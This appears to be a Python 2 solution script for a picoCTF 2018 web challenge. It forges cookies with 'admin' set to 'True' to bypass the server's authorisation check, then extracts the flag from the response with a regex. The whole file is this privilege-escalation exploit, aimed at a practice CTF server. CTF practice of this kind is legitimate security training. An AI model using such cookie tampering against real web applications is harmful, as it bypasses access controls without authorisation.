import requests
import re

params = {
'user' : 'A',
'password' : 'A'}

jar = {
'password' : 'A',
'username' : 'A',
'admin' : 'True' }

r = requests.get('http://2018shell1.picoctf.com:37861/flag', data=params, cookies=jar)
source = r.text
#print re.findall(r'(picoCTF\{.+\})',source)[0]

print re.findall(r'(picoCTF\{.+\})',source)[0]

